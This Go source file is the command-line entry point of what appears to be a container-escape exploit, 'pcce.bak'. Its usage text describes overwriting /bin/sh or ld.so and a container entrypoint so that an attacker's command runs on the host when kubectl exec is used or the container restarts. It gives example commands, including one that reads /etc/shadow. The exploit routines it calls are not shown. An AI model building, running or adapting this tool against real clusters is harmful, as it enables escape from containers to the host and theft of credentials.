//go:build linux

package main

import (
	"fmt"
	"os"
	"strings"
	"time"
)

type Options struct {
	Mode          string
	Cmd           string
	Target        string
	RestartTarget string
	PID           int
	NoRestore     bool
	Preflight     bool
	Timeout       time.Duration
}

func defaultOptions() Options {
	return Options{
		Target:  "/bin/sh",
		PID:     1,
		Timeout: 30 * time.Second,
	}
}

func usage() {
	fmt.Fprintf(os.Stderr, `Usage: pcce.bak <mode> --cmd <command> [options]

Modes:
  exec      Overwrite exec target, wait for kubectl exec to capture target process
  restart   Overwrite ld.so + entrypoint, crash container, auto-exploit on restart
            (creates a placeholder ld.so if none exists)

Options:
  --cmd, -c <command>    Command to execute on host (required)
  --target, -t <path>    Exec target to overwrite (exec mode, default: /bin/sh)
  --restart-target <path> Restart shebang target override (restart mode)
  --pid <pid>            Target PID (restart mode, default: 1)
  --no-restore           Don't auto-restore after payload execution
  --preflight            Run restart checks without writing linker or entrypoint
  --timeout <duration>   Timeout (default: 30s, 0=forever for exec mode)

Examples:
  pcce.bak exec --cmd 'touch /tmp/pwned'
  pcce.bak exec --cmd 'cat /etc/shadow' --target /usr/bin/python3
  pcce.bak restart --cmd 'touch /tmp/pwned'
  pcce.bak restart --preflight --cmd 'true'
`)
}

func parseOptions(args []string) (Options, error) {
	opts := defaultOptions()
	if len(args) > 0 && !strings.HasPrefix(args[0], "-") {
		opts.Mode = args[0]
		args = args[1:]
	}

	for i := 0; i < len(args); i++ {
		switch args[i] {
		case "--cmd", "-c":
			i++
			if i >= len(args) {
				return opts, fmt.Errorf("%s requires a value", args[i-1])
			}
			opts.Cmd = args[i]
		case "--target", "-t":
			i++
			if i >= len(args) {
				return opts, fmt.Errorf("%s requires a value", args[i-1])
			}
			opts.Target = args[i]
		case "--restart-target":
			i++
			if i >= len(args) {
				return opts, fmt.Errorf("--restart-target requires a value")
			}
			opts.RestartTarget = args[i]
		case "--no-restore":
			opts.NoRestore = true
		case "--preflight":
			opts.Preflight = true
		case "--pid":
			i++
			if i >= len(args) {
				return opts, fmt.Errorf("--pid requires a value")
			}
			if _, err := fmt.Sscanf(args[i], "%d", &opts.PID); err != nil {
				return opts, fmt.Errorf("invalid --pid %q: %w", args[i], err)
			}
		case "--timeout":
			i++
			if i >= len(args) {
				return opts, fmt.Errorf("--timeout requires a value")
			}
			d, err := time.ParseDuration(args[i])
			if err != nil {
				return opts, fmt.Errorf("invalid --timeout %q: %w", args[i], err)
			}
			opts.Timeout = d
		case "--help", "-h":
			usage()
			os.Exit(0)
		default:
			return opts, fmt.Errorf("unknown option %q", args[i])
		}
	}
	return opts, nil
}

func validateOptions(opts Options) error {
	if opts.Mode == "" {
		return fmt.Errorf("mode is required (exec or restart)")
	}
	if opts.Cmd == "" && opts.Preflight && opts.Mode == "restart" {
		return nil
	}
	if opts.Cmd == "" {
		return fmt.Errorf("--cmd is required")
	}
	if opts.Preflight && opts.Mode != "restart" {
		return fmt.Errorf("--preflight is only supported for restart mode")
	}
	if opts.PID <= 0 {
		return fmt.Errorf("--pid must be positive")
	}
	if opts.RestartTarget != "" && !strings.HasPrefix(opts.RestartTarget, "/") {
		return fmt.Errorf("--restart-target must be an absolute path")
	}
	return nil
}

func run(opts Options) error {
	if opts.Cmd == "" && opts.Preflight && opts.Mode == "restart" {
		opts.Cmd = "true"
	}
	switch opts.Mode {
	case "exec":
		if opts.Timeout == 30*time.Second {
			opts.Timeout = 0
		}
		return exploitExec(opts.Cmd, opts.Target, opts.Timeout, !opts.NoRestore)
	case "restart":
		if opts.Preflight {
			return preflightRestart(opts.Cmd, opts.PID, opts.Timeout, !opts.NoRestore, opts.RestartTarget)
		}
		return exploitRestart(opts.Cmd, opts.PID, opts.Timeout, !opts.NoRestore, opts.RestartTarget)
	default:
		return fmt.Errorf("unknown mode %q (use exec or restart)", opts.Mode)
	}
}
